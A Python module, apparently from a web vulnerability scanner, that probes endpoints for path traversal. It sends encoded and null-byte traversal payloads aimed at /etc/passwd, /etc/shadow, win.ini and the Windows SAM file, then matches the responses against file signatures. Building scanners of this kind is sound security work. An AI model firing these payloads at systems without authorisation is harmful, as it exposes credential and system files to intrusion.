"""
Path Traversal / Directory Traversal Detector
Detects unauthorized file system access vulnerabilities
"""

import re
import logging

logger = logging.getLogger(__name__)


class PathTraversalDetector:
    """Detect path traversal vulnerabilities
    
    Tests for directory traversal using Linux/Windows payloads and
    detects file disclosure through signature matching.
    """
    
    # Linux/Unix path traversal payloads
    LINUX_PAYLOADS = [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
        "....//....//....//etc/passwd",  # Double slash evasion
        "..%252f..%252f..%252fetc%252fpasswd",  # Double URL encoding
        "..\\..\\..\\etc\\passwd",  # Mixed slashes
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # Encoded dots
        "../../../../../../etc/passwd",
        "../../../etc/hosts",
        "../../../etc/shadow",
        "/etc/passwd",
        "file:///etc/passwd",
    ]
    
    # Windows path traversal payloads
    WINDOWS_PAYLOADS = [
        "..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",  # URL encoded backslash
        "..%255c..%255c..%255cwindows%255cwin.ini",  # Double encoded
        "....\\\\....\\\\....\\\\windows\\win.ini",
        "../../../../../../windows/win.ini",
        "/windows/win.ini",
        "C:\\windows\\win.ini",
        "..\\..\\..\\boot.ini",
        "..\\..\\..\\windows\\system32\\config\\sam",
    ]
    
    # Quick mode payloads (most reliable)
    QUICK_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "../../../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
    ]
    
    # Null byte injection (for older systems)
    NULL_BYTE_PAYLOADS = [
        "../../../etc/passwd%00.jpg",
        "..\\..\\..\\windows\\win.ini%00.png",
    ]
    
    # File disclosure indicators (Linux)
    LINUX_INDICATORS = [
        r'root:x:0:0:',  # /etc/passwd
        r'root:.*:0:0:',
        r'daemon:',
        r'bin:',
        r'nobody:',
        r'# /etc/hosts',
        r'127\.0\.0\.1\s+localhost',
        r'root:\$',  # /etc/shadow
    ]
    
    # File disclosure indicators (Windows)
    WINDOWS_INDICATORS = [
        r'\[extensions\]',  # win.ini
        r'\[fonts\]',
        r'\[files\]',
        r'\[boot loader\]',  # boot.ini
        r'multi\(0\)disk\(0\)',
        r'\[version\]',
    ]
    
    # Common parameter names for file operations
    COMMON_PARAMS = [
        'file', 'path', 'dir', 'folder', 'document', 'doc',
        'page', 'template', 'include', 'load', 'read',
        'filename', 'filepath', 'location', 'url', 'src'
    ]
    
    def __init__(self, client, quick_mode=False):
        """Initialize path traversal detector
        
        Args:
            client: HTTP client for making requests
            quick_mode: If True, use fewer payloads for speed
        """
        self.client = client
        self.quick_mode = quick_mode
        logger.info(f"Path Traversal Detector initialized (quick_mode={quick_mode})")
    
    def test(self, path, param=None):
        """Test endpoint for path traversal"""
        params_to_test = [param] if param else self.COMMON_PARAMS
        
        # Reduce params in quick mode
        if self.quick_mode and not param:
            params_to_test = self.COMMON_PARAMS[:5]
        
        for test_param in params_to_test:
            # Test Linux payloads
            result = self._test_payloads(path, test_param, 'linux')
            if result:
                return result
            
            # Test Windows payloads
            result = self._test_payloads(path, test_param, 'windows')
            if result:
                return result
            
            # Test null byte injection (skip in quick mode)
            if not self.quick_mode:
                result = self._test_null_byte(path, test_param)
                if result:
                    return result
        
        return None
    
    def _test_payloads(self, path, param, os_type):
        """Test specific OS payloads"""
        if os_type == 'linux':
            payloads = self.QUICK_PAYLOADS[:2] if self.quick_mode else self.LINUX_PAYLOADS
            indicators = self.LINUX_INDICATORS
            os_name = "Linux/Unix"
        else:
            payloads = self.QUICK_PAYLOADS[2:] if self.quick_mode else self.WINDOWS_PAYLOADS
            indicators = self.WINDOWS_INDICATORS
            os_name = "Windows"
        
        for payload in payloads:
            try:
                # Try GET request
                res = self.client.get(path, params={param: payload})
                if not res:
                    continue
                
                response_text = res.text.lower() if res.text else ""
                
                # Check for file disclosure indicators
                for indicator in indicators:
                    if re.search(indicator, response_text, re.IGNORECASE):
                        return {
                            "type": "path_traversal",
                            "endpoint": path,
                            "param": param,
                            "payload": payload,
                            "evidence": f"File contents leaked: {indicator}",
                            "os_type": os_name,
                            "confidence": 0.95,
                            "severity": "critical",
                            "description": f"Path traversal vulnerability allows reading {os_name} system files"
                        }
                
                # Check for generic error messages that might indicate successful traversal
                error_indicators = [
                    'no such file or directory',
                    'file not found',
                    'cannot open file',
                    'failed to open',
                    'permission denied',
                    'access denied',
                ]
                
                for error in error_indicators:
                    if error in response_text:
                        # Lower confidence - might be traversal but file doesn't exist
                        return {
                            "type": "path_traversal",
                            "endpoint": path,
                            "param": param,
                            "payload": payload,
                            "evidence": f"File system error message: {error}",
                            "os_type": os_name,
                            "confidence": 0.6,
                            "severity": "high",
                            "description": "Possible path traversal - file system errors exposed"
                        }
                
                # Try POST request as well
                res_post = self.client.post(path, data={param: payload})
                if res_post and res_post.text:
                    response_text_post = res_post.text.lower()
                    for indicator in indicators:
                        if re.search(indicator, response_text_post, re.IGNORECASE):
                            return {
                                "type": "path_traversal",
                                "endpoint": path,
                                "param": param,
                                "payload": payload,
                                "method": "POST",
                                "evidence": f"File contents leaked via POST: {indicator}",
                                "os_type": os_name,
                                "confidence": 0.95,
                                "severity": "critical"
                            }
            
            except Exception as e:
                logger.debug(f"Path traversal test error: {e}")
                continue
        
        return None
    
    def _test_null_byte(self, path, param):
        """Test null byte injection"""
        for payload in self.NULL_BYTE_PAYLOADS:
            try:
                res = self.client.get(path, params={param: payload})
                if not res:
                    continue
                
                response_text = res.text.lower() if res.text else ""
                
                # Check all indicators
                all_indicators = self.LINUX_INDICATORS + self.WINDOWS_INDICATORS
                for indicator in all_indicators:
                    if re.search(indicator, response_text, re.IGNORECASE):
                        return {
                            "type": "path_traversal",
                            "subtype": "null_byte_injection",
                            "endpoint": path,
                            "param": param,
                            "payload": payload,
                            "evidence": f"Null byte injection successful: {indicator}",
                            "confidence": 0.9,
                            "severity": "critical",
                            "description": "Null byte injection allows bypassing file extension restrictions"
                        }
            
            except Exception:
                continue
        
        return None
